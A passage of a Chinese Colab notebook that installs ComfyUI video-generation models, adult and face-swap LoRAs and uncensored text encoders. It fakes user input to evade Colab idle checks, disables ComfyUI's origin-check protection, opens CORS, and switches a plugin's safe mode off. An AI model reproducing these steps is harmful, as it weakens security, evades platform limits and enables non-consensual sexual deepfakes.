    fname, durl = item
    fpath = os.path.join(lora_dir, fname)
    if not os.path.exists(fpath) or os.path.getsize(fpath) < 50 * 1024:
        subprocess.run(["curl", "-L", "-s", "--retry", "3", "-A", "Mozilla/5.0", "-o", fpath, durl], check=False)

with ThreadPoolExecutor(max_workers=4) as ex:
    list(ex.map(_dl_civ, civitai_loras))

print(f"📂 [4/4] 正在初始化干净工作流目录 (已耗时 {int(time.time()-t0)}s)...")
os.makedirs("/content/ComfyUI/input", exist_ok=True)
if not os.path.exists("/content/ComfyUI/input/song83_magnetic.mp3"):
    subprocess.run("ffmpeg -y -f lavfi -i 'sine=frequency=440:duration=5' -ac 2 -ar 44100 /content/ComfyUI/input/song83_magnetic.mp3 >/dev/null 2>&1", shell=True)
if not os.path.exists("/content/ComfyUI/input/MV02I.mp4"):
    subprocess.run("ffmpeg -y -f lavfi -i 'testsrc=duration=5:size=832x480:rate=24' -f lavfi -i 'sine=frequency=440:duration=5' -c:v libx264 -pix_fmt yuv420p -c:a aac -shortest /content/ComfyUI/input/MV02I.mp4 >/dev/null 2>&1", shell=True)

wf_dir = "/content/ComfyUI/user/default/workflows"
wf_pool_h3 = "/content/wf_pool_h3"
os.makedirs(wf_dir, exist_ok=True)
os.makedirs(wf_pool_h3, exist_ok=True)
wf_data = json.loads(zlib.decompress(base64.b64decode("...")).decode("utf-8"))
for fname, content in wf_data.items():
    for _td in (wf_dir, wf_pool_h3):
        _tp = os.path.join(_td, fname)
        if not os.path.exists(_tp) or os.path.getsize(_tp) < 100:
            with open(_tp, "w", encoding="utf-8") as f:
                json.dump(content, f, ensure_ascii=False, indent=2)
_vhs_core_p = "/content/ComfyUI/custom_nodes/ComfyUI-VideoHelperSuite/web/js/VHS.core.js"
if os.path.exists(_vhs_core_p):
    _vhs_s = open(_vhs_core_p, "r", encoding="utf-8").read()
    if "__H3_LORA_AUTO_TRIGGER_V3__" not in _vhs_s:
        open(_vhs_core_p, "a", encoding="utf-8").write("\n" + base64.b64decode("...").decode("utf-8"))

import base64 as _b64, zlib as _zlib
for _wfn, _wfb in {}.items():
    _raw = _zlib.decompress(_b64.b64decode(_wfb)).decode("utf-8")
    for _d in ["/content/wf_pool_h3", "/content/ComfyUI/user/default/workflows"]:
        with open(os.path.join(_d, _wfn), "w", encoding="utf-8") as _f:
            _f.write(_raw)

os.makedirs("/content/ComfyUI/models/loras", exist_ok=True)
for _f in os.listdir("/content/lora_pool_h3"):
    if _f.endswith(".safetensors"):
        _dst = os.path.join("/content/ComfyUI/models/loras", _f)
        if os.path.exists(_dst) and not os.path.islink(_dst) and os.path.getsize(_dst) < 50 * 1024:
            try: os.remove(_dst)
            except Exception: pass
        if not os.path.exists(_dst):
            try: os.symlink(os.path.join("/content/lora_pool_h3", _f), _dst)
            except Exception: pass

print(f"\n🎉 [基础框架] 极速安装完成 (总耗时 {int(time.time()-t0)} 秒)！现在请在左侧目录选择下方任意一个模型选项（2~6）点击运行！")
# If ComfyUI is already running, restart it cleanly so newly installed node dependencies take effect
import socket as _sk
_s = _sk.socket(); _s.settimeout(1)
_is_up = (_s.connect_ex(("127.0.0.1", 8188)) == 0); _s.close()
if _is_up:
    subprocess.run(["pkill", "-9", "-f", "main.py"], check=False)
    time.sleep(1)
    subprocess.Popen(["bash", "-c", "nohup python main.py --dont-print-server --enable-cors-header '*' > /content/comfyui.log 2>&1 &"], cwd="/content/ComfyUI", start_new_session=True)
    for _ in range(60):
        try:
            urllib.request.urlopen("http://127.0.0.1:8188/system_stats", timeout=2)
            break
        except Exception:
            time.sleep(0.5)
_pca_ext = "/content/ComfyUI/custom_nodes/ai-pose-gallery-zh/comfyui_plugin/web/extension.js"
if os.path.exists(_pca_ext):
    _pca_s = open(_pca_ext, "r", encoding="utf-8").read()
    if "this.safeMode = true;" in _pca_s:
        _pca_s = _pca_s.replace("this.safeMode = true;", "this.safeMode = false;")
        open(_pca_ext, "w", encoding="utf-8").write(_pca_s)

# === 自动修复 FeiHou-Easy-H3 前端九宫格画布 404 与 X2-Detail 超分 VAE 兼容 ===
import os, glob, shutil
fh_web = "/content/ComfyUI/custom_nodes/ComfyUI-FeiHou-Easy-H3/web"
if os.path.isdir(fh_web):
    src_ms = os.path.join(fh_web, "minimax_h3_clean_media_settings.js")
    dst_ms = os.path.join(fh_web, "feihou_easy_h3_media_settings.js")
    if os.path.exists(src_ms) and not os.path.exists(dst_ms):
        shutil.copy2(src_ms, dst_ms)
    ui_js = os.path.join(fh_web, "minimax_h3_clean_ui.js")
    if os.path.exists(ui_js):
        with open(ui_js, "r", encoding="utf-8") as _f:
            _c = _f.read()
        if "./feihou_easy_h3_media_settings.js" in _c:
            _c = _c.replace("./feihou_easy_h3_media_settings.js", "./minimax_h3_clean_media_settings.js")
            with open(ui_js, "w", encoding="utf-8") as _f:
                _f.write(_c)
        ui_gz = ui_js + ".gz"
        if os.path.exists(ui_gz):
            os.remove(ui_gz)

In [ ]:
# @title 🎬 2. 文生 + 首尾帧视频选项（官方64G文生底模 + 默认25G CLIP）
# === [AGY_COLAB_KEEPALIVE_GUARD] ===
try:
    from IPython.display import display, Javascript
    display(Javascript('''
    (function(){
      try {
        if (!window._agyKeepAliveAudio) {
          const Ctx = window.AudioContext || window.webkitAudioContext;
          const ctx = new Ctx();
          const osc = ctx.createOscillator();
          const g = ctx.createGain();
          g.gain.value = 0.00001;
          osc.connect(g); g.connect(ctx.destination); osc.start();
          window._agyKeepAliveAudio = ctx;
        }
      } catch(e){}
      if (window._agyKeepAliveTimer) clearInterval(window._agyKeepAliveTimer);
      window._agyKeepAliveTimer = setInterval(() => {
        try {
          if (window._agyKeepAliveAudio && window._agyKeepAliveAudio.state === 'suspended') window._agyKeepAliveAudio.resume();
          const doc = window.parent ? window.parent.document : document;
          doc.dispatchEvent(new MouseEvent('mousemove', {bubbles:true, clientX:120, clientY:120}));
          doc.dispatchEvent(new KeyboardEvent('keydown', {bubbles:true, key:'Shift'}));
        } catch(e){}
      }, 45000);
    })();
    '''))
except Exception:
    pass
# --- Auto-Ensure Pika H3 Flex 6-Step Turbo LoRAs (Ref2VA & FL2VA) ---
def _ensure_pika_h3_flex_loras():
    import os, subprocess
    lora_dir = "/content/lora_pool_h3"
    os.makedirs(lora_dir, exist_ok=True)
    pika_loras = [
        ("https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/loras/pika_h3_flex_ref2va_v1_bf16.safetensors", "【6步极速-Pika_H3_Flex官方多参版】pika_h3_flex_ref2va_v1_bf16.safetensors"),
        ("https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/loras/pika_h3_flex_fl2va_v1_bf16.safetensors", "【6步极速-Pika_H3_Flex官方首尾帧版】pika_h3_flex_fl2va_v1_bf16.safetensors"),
        ("https://huggingface.co/Kijai/MiniMax-H3_comfy/resolve/main/loras/Pika/pika_h3_flex_ref2va_v1_avg_rank_55_bf16.safetensors", "【6步极速-Pika_H3_Flex轻量多参版】pika_h3_flex_ref2va_kijai_bf16.safetensors"),
        ("https://huggingface.co/Kijai/MiniMax-H3_comfy/resolve/main/loras/Pika/pika_h3_flex_fl2va_v1_avg_rank_56_bf16.safetensors", "【6步极速-Pika_H3_Flex轻量首尾帧版】pika_h3_flex_fl2va_kijai_bf16.safetensors"),
    ("https://huggingface.co/Kijai/MiniMax-H3-experimental/resolve/main/loras/minimax_h3_open_regenerate_2k_refiner_rank_16_bf16.safetensors", "【2K超清重绘精修LoRA-OpenRegen】minimax_h3_open_regenerate_2k_refiner_rank_16_bf16.safetensors"),
    ("https://huggingface.co/Alissonerdx/Minimax-H3-ComfyUI/resolve/main/loras/minimax_h3_character_swap_v1.1_ref2va_fro.safetensors", "【视频换人角色替换LoRA-Alisson】minimax_h3_character_swap_v1.1_ref2va_fro.safetensors"),
    ("https://huggingface.co/Alissonerdx/Minimax-H3-ComfyUI/resolve/main/loras/minimax_h3_head_swap_v1.0_r32.safetensors", "【视频换头换脸LoRA-Alisson】minimax_h3_head_swap_v1.0_r32.safetensors"),
    ("https://huggingface.co/Alissonerdx/Minimax-H3-ComfyUI/resolve/main/loras/minimax_h3_motion_transfer_ffp_v1.0_ref2va.safetensors", "【视频动作迁移跳舞LoRA-Alisson】minimax_h3_motion_transfer_ffp_v1.0_ref2va.safetensors"),
    ]
    for url, fname in pika_loras:
        dst = os.path.join(lora_dir, fname)
        if not os.path.exists(dst) or os.path.getsize(dst) < 1024 * 1024:
            print(f"⚡ 正在自动下载 Pika H3 Flex 6步极速加速模型: {fname} ...")
            subprocess.run(["aria2c", "-c", "-x", "16", "-s", "16", "-k", "1M", "--console-log-level=error", "-d", lora_dir, "-o", fname, url], check=False)
_ensure_pika_h3_flex_loras()

import os, subprocess, json
cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    cm_txt = open(cm_path, "r", encoding="utf-8").read()
    if "_OBJ_INFO_CACHE" not in cm_txt:
        open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip, mimetypes
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}
_FILE_MEM_CACHE = {}

def _guess_ct(path: str) -> str:
    p = path.lower()
    if p.endswith((".js", ".mjs", ".cjs")):
        return "application/javascript"
    if p.endswith(".css"):
        return "text/css"
    if p.endswith(".json"):
        return "application/json"
    if p.endswith(".svg"):
        return "image/svg+xml"
    if p.endswith(".wasm"):
        return "application/wasm"
    ct, _ = mimetypes.guess_type(p)
    return ct or "application/octet-stream"

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    for extra_d in ("/content/ComfyUI/custom_nodes", "/content/ComfyUI/input"):
        if os.path.isdir(extra_d):
            try:
                parts.append(",".join(sorted(os.listdir(extra_d))))
            except Exception:
                pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.method == "POST" and ("upload" in request.path):
        _OBJ_INFO_CACHE["key"] = None
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/user.css", "/api/userdata/user.css"):
        return web.Response(text="", content_type="text/css", headers={"Cache-Control": "public, max-age=86400"})
    if request.path == "/api/userdata/comfy.templates.json":
        return web.Response(text="[]", content_type="application/json", headers={"Cache-Control": "public, max-age=86400"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
    if request.method == "GET" and request.path in _FILE_MEM_CACHE:
        entry = _FILE_MEM_CACHE[request.path]
        if accept_gz and entry["gz"] is not None:
            return web.Response(body=entry["gz"], content_type=entry["ct"], headers={"Content-Encoding": "gzip", "Cache-Control": entry["cc"]})
        return web.Response(body=entry["raw"], content_type=entry["ct"], headers={"Cache-Control": entry["cc"]})
    response: web.Response = await handler(request)
    if request.path.startswith(("/extensions/", "/assets/", "/rgthree/", "/scripts/")) and response.status == 200:
        cc = "public, max-age=604800, immutable" if request.path.startswith("/assets/") else "public, max-age=3600"
        response.headers["Cache-Control"] = cc
        fpath = getattr(response, "_path", None)
        if fpath and os.path.isfile(str(fpath)):
            try:
                raw_b = open(str(fpath), "rb").read()
                ct = _guess_ct(request.path)
                gz_b = gzip.compress(raw_b, compresslevel=5) if len(raw_b) > 512 else None
                _FILE_MEM_CACHE[request.path] = {"raw": raw_b, "gz": gz_b, "ct": ct, "cc": cc}
                if accept_gz and gz_b is not None:
                    return web.Response(body=gz_b, content_type=ct, headers={"Content-Encoding": "gzip", "Cache-Control": cc})
                return web.Response(body=raw_b, content_type=ct, headers={"Cache-Control": cc})
            except Exception:
                pass
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and accept_gz
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")

if not os.path.exists("/content/ComfyUI/custom_nodes/ComfyUI-MiniMaxH3-TimelineDirector"):
    subprocess.run(["git", "clone", "--depth", "1", "https://github.com/Songssx/ComfyUI-MiniMaxH3-TimelineDirector.git", "/content/ComfyUI/custom_nodes/ComfyUI-MiniMaxH3-TimelineDirector"], check=False)
for _h3_cn, _h3_url in [("ComfyUI-H3-LongVideo", "https://github.com/Zzz1phyrf/ComfyUI-H3-LongVideo.git"), ("selflift-Avatar", "https://github.com/slmonker/selflift-Avatar.git"), ("ComfyUI-YCNodes-MiniMax-H3", "https://github.com/yichengup/ComfyUI-YCNodes-MiniMax-H3.git"), ("rgthree-comfy", "https://github.com/rgthree/rgthree-comfy.git"), ("ComfyUI-MiniMaxH3-PrefixStream", "https://github.com/knoic/ComfyUI-MiniMaxH3-PrefixStream.git"), ("ComfyUI-FeiHou-Easy-H3", "https://github.com/FX-FeiHou/ComfyUI-FeiHou-Easy-H3.git"), ("ComfyUI-MiniMaxH3_LatentUpscaler", "https://github.com/TripleHeadedMonkey/ComfyUI-MiniMaxH3_LatentUpscaler.git"), ("BSAI-MiniMAX-H3-Prompt", "https://github.com/xm6018924/BSAI-MiniMAX-H3-Prompt.git")]:
    if not os.path.exists(f"/content/ComfyUI/custom_nodes/{_h3_cn}"):
        subprocess.run(["git", "clone", "--depth", "1", _h3_url, f"/content/ComfyUI/custom_nodes/{_h3_cn}"], check=False)
        if _h3_cn == "ComfyUI-H3-LongVideo": subprocess.run([sys.executable, "-m", "pip", "install", "-q", "faster-whisper==1.2.1"], check=False)
# @markdown > 💡 **选择配套 CLIP 文本编码器**（切换无需重装框架，直接点击运行即可）：
轻量化CLIP选择 = "25G 社区版INT8未删减版 (C站原帖钦定配套 · 宽松审核允许大人)" # @param ["25G 社区版INT8未删减版 (C站原帖钦定配套 · 宽松审核允许大人)", "15G Heretic破限未删减极速版 (Momoking NVFP4 · 宽松审核)"]
重置默认工作流 = False # @param {type:"boolean"}

diff_dir = "/content/ComfyUI/models/diffusion_models"
clip_dir = "/content/ComfyUI/models/text_encoders"
import shutil as _sh_a2
if not _sh_a2.which("aria2c"):
    subprocess.run("apt-get update -qq && apt-get install -y -qq aria2 >/dev/null 2>&1", shell=True, check=False)
os.makedirs(diff_dir, exist_ok=True)
os.makedirs(clip_dir, exist_ok=True)

target_model = "【64G满血原版-文生图生首尾帧】minimax_h3_fl2va_bf16.safetensors"
if "15G 官方NVFP4" in 轻量化CLIP选择:
    target_clip = "【15G轻量化极速版-CLIP】qwen3vl_32b_minimax_h3_nvfp4_awq.safetensors"
    clip_url = "https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/text_encoders/qwen3vl_32b_minimax_h3_nvfp4_awq.safetensors"
elif "25G 官方INT8" in 轻量化CLIP选择:
    target_clip = "【25G轻量化均衡版-CLIP】qwen3vl_32b_minimax_h3_int8_convrot.safetensors"
    clip_url = "https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/text_encoders/qwen3vl_32b_minimax_h3_int8_convrot.safetensors"
elif "15G Heretic" in 轻量化CLIP选择:
    target_clip = "【15G破限未删减极速版-CLIP】qwen3vl_32b_heretic_minimax_h3_nvfp4.safetensors"
    clip_url = "https://huggingface.co/Momoking/Qwen3-VL-32B-Heretic-MiniMax-H3-NVFP4/resolve/main/qwen3vl_32b_heretic_minimax_h3_nvfp4.safetensors"
else:
    target_clip = "【25G轻量化未删减-C站Remix配套CLIP】minimaxH3Remix_int8ConvrotV06Fixed_txt.safetensors"
    clip_url = "https://huggingface.co/linjian257/qwen3vl_32b_minimax_h3_int8_convrot_uncensored-by-linjian257/resolve/main/qwen3vl_32b_minimax_h3_int8_convrot_uncensored-by-linjian257.safetensors"

print("🧹 正在卸载其他底模与非配套 CLIP，严格只保留当前所选配置（释放磁盘空间）...")
for f in list(os.listdir(diff_dir)):
    fp = os.path.join(diff_dir, f)
    if os.path.islink(fp):
        os.unlink(fp)
    elif f.endswith(".safetensors") and f != target_model:
        print(f"  🗑️ 已卸载其他底模: {f}")
        os.remove(fp)
for f in list(os.listdir(clip_dir)):
    fp = os.path.join(clip_dir, f)
    if os.path.islink(fp):
        os.unlink(fp)
    elif f.endswith(".safetensors") and f != target_clip:
        print(f"  🗑️ 已卸载非当前 CLIP: {f}")
        os.remove(fp)

print(f"⏳ 正在检查/下载 64G 官方文生底模: {target_model} ...")
subprocess.run([
    "aria2c", "-c", "-x", "16", "-s", "16", "--file-allocation=none",
    "-d", diff_dir, "-o", target_model,
    "https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/diffusion_models/minimax_h3_fl2va_bf16.safetensors"
], check=True)

print(f"⏳ 正在检查/下载官方配套 CLIP: {target_clip} ...")
subprocess.run([
    "aria2c", "-c", "-x", "16", "-s", "16", "--file-allocation=none",
    "-d", clip_dir, "-o", target_clip, clip_url
], check=True)

os.makedirs("/content/lora_pool_h3", exist_ok=True)
# Auto-install all H3 LoRAs (including the 4 new Civitai LoRAs) whenever any H3 cell runs
import urllib.request as _ur_l
from concurrent.futures import ThreadPoolExecutor as _TPE_L
_h3_pool = "/content/lora_pool_h3"
os.makedirs(_h3_pool, exist_ok=True)
_civ_tok = globals().get("C站_API_Token", "")
_civ_h3_list = [["3413468", "3305979", "【H3-C站大人解锁V2.1】Minimax_H3_Unlocked_V2.1.safetensors"], ["3399711", "3290118", "【H3-C站大人-女性特写动作V1】H3_Female_Action_V1.safetensors"], ["3394502", "3284268", "【H3-C站大人-去衣动作V1.1】H3_Remove_Clothes_V1.1.safetensors"], ["3268303", "3152083", "【H3-C站大人-全能互动AIO_V2.5】H3_AIO_Interaction_V2.5.safetensors"], ["3206518", "3088013", "【H3-C站大人-全能互动AIO_V2】H3_AIO_Interaction_V2.safetensors"], ["3416478", "3311427", "【H3-C站大人-双人互动增强V5_全参】Mystic_MMH3_V5_Ref2VA.safetensors"], ["3403761", "3294817", "【C站成人-传教士姿势增强V1】MISSIONLG_H3_v1.safetensors"], ["3420786", "3314770", "【H3-C站大人-亲密互动特写V1】H3_Close_Interaction_V1.safetensors"], ["3404369", "3295540", "【H3-C站大人-身材细节增强V1】H3_Body_Detail_V1.safetensors"], ["3237012", "3119472", "【H3-C站大人-丰满曲线增强V0.3】H3_Curvy_Helper_V0.3.safetensors"], ["3402446", "3293205", "【H3-C站大人-俯视领口走光增强V1】Down_blouse_101-h3.safetensors"], ["3426349", "3321345", "【H3-C站大人-抓头发互动动作V1】hair_pulling_h3_101.safetensors"], ["3408385", "3300137", "【H3-C站大人-快慢动作极限滑块V2】PornMaster_MMH3_Fast_motion_slider_V2.safetensors"], ["3202732", "3091422", "【4步加速LoRA-Turbo社区版】minimax_h3_turbo_v4_step600_pruned_comfyui.safetensors"], ["3384273", "3273015", "【慢动作丝滑同步LoRA】SSS_Rank_MiniMax_H3_Smooth_Slow_Sync.safetensors"], ["3421124", "3315156", "【真人皮肤去油光LoRA】MMH3_RealismSlider_V1.safetensors"], ["3314964", "3200403", "【细节锐化增强LoRA】MMH3_DetailSlider_V1.safetensors"], ["3409409", "3301293", "【动作速度调节LoRA】MMH3_ActionSpeedSlider_V1.safetensors"], ["3389300", "3278497", "【C站增强-动作快慢速率滑块】H3_speed_slider_1.1.safetensors"]]
class _NoRedirL(_ur_l.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl): return None
_civ_op_l = _ur_l.build_opener(_NoRedirL)
def _res_civ_l(item):
    _vid, _fid, _fn = item
    _fp = os.path.join(_h3_pool, _fn)
    if os.path.exists(_fp) and os.path.getsize(_fp) > 50000: return None
    _u = f"https://civitai.com/api/download/models/{_vid}?fileId={_fid}&token={_civ_tok}"
    try: _civ_op_l.open(_ur_l.Request(_u, headers={"User-Agent": "Mozilla/5.0"}), timeout=12)
    except _ur_l.HTTPError as _e:
        if _e.headers.get("Location"): return (_e.headers.get("Location"), _fn)
    except Exception: pass
    return (_u, _fn)
_aria_l = []
with _TPE_L(max_workers=10) as _ex_l:
    for _r in _ex_l.map(_res_civ_l, _civ_h3_list):
        if _r: _aria_l.append(f"{_r[0]}\n  dir={_h3_pool}\n  out={_r[1]}")
if _aria_l:
    print(f"⏳ 正在自动并发补齐 {len(_aria_l)} 个 H3 专属 C站 LoRA...")
    open("/tmp/h3_civ_loras.txt", "w", encoding="utf-8").write("\n".join(_aria_l) + "\n")
    subprocess.run(["aria2c", "-i", "/tmp/h3_civ_loras.txt", "-c", "-j", "16", "-x", "16", "-s", "16", "--file-allocation=none", "--console-log-level=warn"], check=False)
for _del_d in ("/content/lora_pool_h3", "/content/ComfyUI/models/loras"):
    if os.path.isdir(_del_d):
        for _del_f in ['【C站成人-双人互动增强V1】MysticXXX_MMH3-V1.safetensors', '【H3-C站大人-双人互动增强V5_文生图生】Mystic_MMH3_V5_FL2VA.safetensors', '【H3-C站大人-高频动作律动增强V2_文生图生】H3_Motion_Booster_V2.safetensors', '【H3-C站大人-高频动作律动增强V2_全参】H3_Motion_Booster_V2_Ref2VA.safetensors', '【H3-C站大人-流体特效增强V1】H3_Fluid_Effect_V1.safetensors']:
            _del_p = os.path.join(_del_d, _del_f)
            if os.path.exists(_del_p) or os.path.islink(_del_p):
                try: os.remove(_del_p)
                except Exception: pass
for _old_up in ("minimax_h3_bf16_CONSERVATIVE_v5.safetensors", "minimax_h3_latent_upscaler_3d_conv_v1_fp16.safetensors"):
    _up_p = os.path.join("/content/ComfyUI/models/latent_upscale_models", _old_up)
    if os.path.islink(_up_p):
        try: os.unlink(_up_p)
        except Exception: pass
os.makedirs("/content/lora_pool_h3", exist_ok=True)
os.makedirs("/content/lora_pool_qwen", exist_ok=True)
_lora_active = "/content/ComfyUI/models/loras"
os.makedirs(_lora_active, exist_ok=True)
for _f in list(os.listdir(_lora_active)):
    _p = os.path.join(_lora_active, _f)
    if os.path.islink(_p):
        try: os.unlink(_p)
        except Exception: pass
    elif os.path.isfile(_p) and _f.endswith(".safetensors"):
        _is_qw = any(_k in _f for _k in ("千问", "Qwen", "qwen", "Anime2Real", "2anime", "canon_qwen", "chatrlabs", "multiple_angles", "viggle", "NoctQA"))
        _pool = "/content/lora_pool_qwen" if _is_qw else "/content/lora_pool_h3"
        try: os.replace(_p, os.path.join(_pool, _f))
        except Exception: pass
for _f in sorted(os.listdir("/content/lora_pool_h3")):
    _src_p = os.path.join("/content/lora_pool_h3", _f)
    if _f.endswith(".safetensors") and os.path.exists(_src_p) and os.path.getsize(_src_p) > 50 * 1024:
        _dst_p = os.path.join(_lora_active, _f)
        if not os.path.exists(_dst_p):
            try: os.symlink(_src_p, _dst_p)
            except Exception: pass
print("🧹 已切换为【H3视频专属LoRA与工作流配置（自动隔离千问LoRA & 保护你在网页修改的工作流）】")

import shutil as _sh
wf_dir = "/content/ComfyUI/user/default/workflows"
os.makedirs(wf_dir, exist_ok=True)
os.makedirs("/content/wf_pool_h3", exist_ok=True)
os.makedirs("/content/wf_pool_qwen", exist_ok=True)
for _wf in list(os.listdir(wf_dir)):
    if _wf.endswith(".json"):
        _wfp = os.path.join(wf_dir, _wf)
        if "qwen" in _wf.lower() or "千问" in _wf:
            try:
                _sh.copy2(_wfp, os.path.join("/content/wf_pool_qwen", _wf))
                os.remove(_wfp)
            except Exception: pass
        elif not globals().get("重置默认工作流", False) and os.path.getsize(_wfp) > 100:
            try: _sh.copy2(_wfp, os.path.join("/content/wf_pool_h3", _wf))
            except Exception: pass
for _wf in os.listdir("/content/wf_pool_h3"):
    if _wf.endswith(".json") and not ("qwen" in _wf.lower() or "千问" in _wf):
        _dst_wf = os.path.join(wf_dir, _wf)
        if globals().get("重置默认工作流", False) or not os.path.exists(_dst_wf) or os.path.getsize(_dst_wf) < 100:
            try: _sh.copy2(os.path.join("/content/wf_pool_h3", _wf), _dst_wf)
            except Exception: pass
if not [f for f in os.listdir(wf_dir) if f.endswith(".json")]:
    import base64, zlib
    _wfs = json.loads(zlib.decompress(base64.b64decode("...")).decode("utf-8"))
    for _fn, _wdata in _wfs.items():
        json.dump(_wdata, open(os.path.join(wf_dir, _fn), "w", encoding="utf-8"), ensure_ascii=False, indent=2)
for _target_wdir in [wf_dir, "/content/wf_pool_h3"]:
  if os.path.exists(_target_wdir):
    for wfname in sorted(os.listdir(_target_wdir)):
        if wfname.endswith(".json") and not ("qwen" in wfname.lower() or "千问" in wfname):
            wpath = os.path.join(_target_wdir, wfname)
            try:
                wf = json.load(open(wpath, encoding="utf-8"))
                all_nodes = list(wf.get("nodes", []))
                for sg in wf.get("definitions", {}).get("subgraphs", []):
                    all_nodes.extend(sg.get("nodes", []))
                for n in all_nodes:
                    ntype = n.get("type", "")
                    wv = n.get("widgets_values")
                    if ntype == "UNETLoader" and isinstance(wv, list) and len(wv) >= 1:
                        wv[0] = target_model
                    elif ntype == "CLIPLoader" and isinstance(wv, list) and len(wv) >= 1:
                        wv[0] = target_clip
                    elif ntype == "FeiHouEasyH3Loader" and isinstance(wv, list) and len(wv) >= 3:
                        wv[0], wv[1], wv[2] = target_model, target_model, target_clip
                    elif ntype == "FeiHouEasyH3RemixLoader" and isinstance(wv, list) and len(wv) >= 2:
                        wv[0], wv[1] = target_model, target_clip
                    elif ntype == "4c314f31-ecda-4b08-ae98-faaba1bf613f" and isinstance(wv, list) and len(wv) >= 7:
                        wv[5], wv[6] = target_model, target_clip
                json.dump(wf, open(wpath, "w", encoding="utf-8"), ensure_ascii=False, indent=2)
            except Exception:
                pass

import time, socket, re, urllib.request, gzip, shutil, pathlib
from google.colab import output
from IPython.display import display, HTML

os.chdir("/content/ComfyUI")

s_path = "/content/ComfyUI/server.py"
if os.path.exists(s_path):
    txt = open(s_path, "r", encoding="utf-8").read()
    if "return await handler(request) # patched" not in txt:
        txt = txt.replace(
            "def create_origin_only_middleware():",
            "def create_origin_only_middleware():\n    from aiohttp import web\n    @web.middleware\n    async def _noop(request, handler):\n        return await handler(request) # patched\n    return _noop\ndef _old_origin():"
        )
        open(s_path, "w", encoding="utf-8").write(txt)

cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    cm_txt = open(cm_path, "r", encoding="utf-8").read()
    if "max-age=604800" not in cm_txt or '.endswith(".js")' in cm_txt:
        open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip, mimetypes
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}
_FILE_MEM_CACHE = {}

def _guess_ct(path: str) -> str:
    p = path.lower()
    if p.endswith((".js", ".mjs", ".cjs")):
        return "application/javascript"
    if p.endswith(".css"):
        return "text/css"
    if p.endswith(".json"):
        return "application/json"
    if p.endswith(".svg"):
        return "image/svg+xml"
    if p.endswith(".wasm"):
        return "application/wasm"
    ct, _ = mimetypes.guess_type(p)
    return ct or "application/octet-stream"

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    for extra_d in ("/content/ComfyUI/custom_nodes", "/content/ComfyUI/input"):
        if os.path.isdir(extra_d):
            try:
